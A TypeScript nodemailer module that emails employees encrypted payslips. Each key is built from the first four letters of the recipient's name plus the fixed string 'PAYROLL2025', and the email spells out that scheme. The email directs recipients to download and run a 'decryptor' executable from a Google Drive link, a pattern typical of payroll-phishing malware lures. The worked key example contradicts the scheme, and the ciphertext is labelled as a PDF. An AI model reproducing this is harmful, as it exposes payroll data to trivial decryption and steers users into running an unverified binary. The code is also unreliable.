import nodemailer from "nodemailer";
import { formatMonthYear } from "../utils/dateUtils";
import { encryptData, generateSecureKey } from "./encryption.service";

// Create reusable transport
const createTransporter = () => {
  return nodemailer.createTransport({
    host: process.env.EMAIL_HOST || "smtp.gmail.com",
    port: parseInt(process.env.EMAIL_PORT || "587"),
    secure: process.env.EMAIL_SECURE === "true",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });
};

/**
 * Generate a secure encryption key from user data
 */
const generateUserEncryptionKey = (name: string): string => {
  // Take first 4 letters of name and convert to lowercase
  const namePrefix = name.substring(0, 4).toLowerCase();
  // Add a fixed salt for additional security
  const salt = "PAYROLL2025";
  return `${namePrefix}${salt}`;
};

/**
 * Send payroll email with encrypted PDF attachment
 */
export const sendPayrollEmail = async (
  recipientEmail: string,
  recipientName: string,
  pdfBuffer: Buffer,
  payPeriod: { start_date: Date; end_date: Date },
  monthYear?: string,
  organizationName?: string
): Promise<void> => {
  try {
    const transporter = createTransporter();

    // Format the month and year for the subject line
    const periodDisplay =
      monthYear || formatMonthYear(new Date(payPeriod.start_date));
    const orgName = organizationName || "PayrollPro";

    // Generate encryption key using only the user's name
    const encryptionKey = generateUserEncryptionKey(recipientName);

    // Log encryption details for debugging
    console.log(
      `Encrypting PDF for ${recipientName} with key prefix: ${encryptionKey.substring(0, 4)}`
    );

    // Encrypt the PDF buffer
    const encryptedPdfBuffer = encryptData(pdfBuffer, encryptionKey);

    // Verify encryption was successful
    if (!encryptedPdfBuffer || encryptedPdfBuffer.length === 0) {
      throw new Error("PDF encryption failed - empty buffer returned");
    }

    console.log(
      `PDF encrypted successfully. Original size: ${pdfBuffer.length}, Encrypted size: ${encryptedPdfBuffer.length}`
    );

    // Prepare email with detailed decryption instructions
    const mailOptions = {
      from: `"${orgName} Payroll" <${process.env.EMAIL_USER}>`,
      to: recipientEmail,
      subject: `Your Encrypted Payslip for ${periodDisplay}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; color: #333;">
          <h2 style="color: #2563eb;">Encrypted Payslip for ${periodDisplay}</h2>
          
          <p>Hello ${recipientName},</p>
          
          <p>Please find attached your encrypted payslip for the period ${periodDisplay}.</p>
          
          <div style="background-color: #f8f9fa; padding: 15px; border-left: 4px solid #2563eb; margin: 20px 0;">
            <h3 style="color: #2563eb; margin-top: 0;">How to Decrypt Your Payslip</h3>
            
            <h4 style="margin: 15px 0 10px 0;">Step 1: Download the attached encrypted PDF file</h4>
            
            <h4 style="margin: 15px 0 10px 0;">Step 2: Download the Decryption Tool</h4>
            <p>To decrypt your payslip, please download our official decryption tool from the following link:</p>
            <p><a href="https://drive.google.com/file/d/1lKKgsPTDLTbSItI_4WfMDSKmrcnkH8Nx/view?usp=sharing" target="_blank" style="color: #2563eb; font-weight: bold;">Download PayrollPro Decryptor</a></p>
            <p>After downloading, run the tool and follow the instructions below.</p>
            
            <h4 style="margin: 15px 0 10px 0;">Step 3: Generate Your Decryption Key</h4>
            <p>Your decryption key is generated using:</p>
            <ul style="margin: 10px 0;">
              <li>First 4 letters of your name (in lowercase) +</li>
              <li>Fixed security code: PAYROLL2025</li>
            </ul>
            
            <div style="background-color: #fff; padding: 10px; border: 1px solid #ddd; margin: 10px 0;">
              <p style="margin: 0;"><strong>Example:</strong></p>
              <p style="margin: 5px 0;">Name: Ram Bahadur
              <p style="margin: 5px 0;">Decryption Key: <strong>ramROLL2025</strong></p>
            </div>
            
            <h4 style="margin: 15px 0 10px 0;">Step 4: Decrypt the PDF</h4>
            <ol style="margin: 10px 0;">
              <li>Open the PayrollPro Decryptor tool.</li>
              <li>Select the encrypted PDF you downloaded from this email.</li>
              <li>Enter your decryption key as described above.</li>
              <li>Choose where to save the decrypted PDF.</li>
              <li>Open your decrypted payslip with any PDF reader.</li>
            </ol>
          </div>
          
          <div style="background-color: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0;">
            <h4 style="color: #856404; margin-top: 0;">Important Security Notes:</h4>
            <ul style="margin: 10px 0; color: #856404;">
              <li>Keep your decryption key secure and do not share it with anyone</li>
              <li>Do not store the decryption key in an easily accessible location</li>
              <li>After viewing your payslip, consider deleting the decrypted file</li>
            </ul>
          </div>
          
          <p>If you need help decrypting your payslip, please contact your HR department.</p>
          
          <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee;">
            <p style="font-size: 12px; color: #666;">
              This is an automated email. Please do not reply to this message.
            </p>
          </div>
        </div>
      `,
      attachments: [
        {
          filename: `Encrypted_Payslip_${recipientName.replace(/\s+/g, "_")}_${periodDisplay.replace(/\s+/g, "_")}.pdf`,
          content: encryptedPdfBuffer,
          contentType: "application/pdf",
        },
      ],
    };

    // Send email
    await transporter.sendMail(mailOptions);
    console.log(`Encrypted payroll email sent to ${recipientEmail}`);
  } catch (error) {
    console.error("Error sending encrypted payroll email:", error);
    throw new Error(
      `Failed to send encrypted payroll email: ${(error as Error).message}`
    );
  }
};
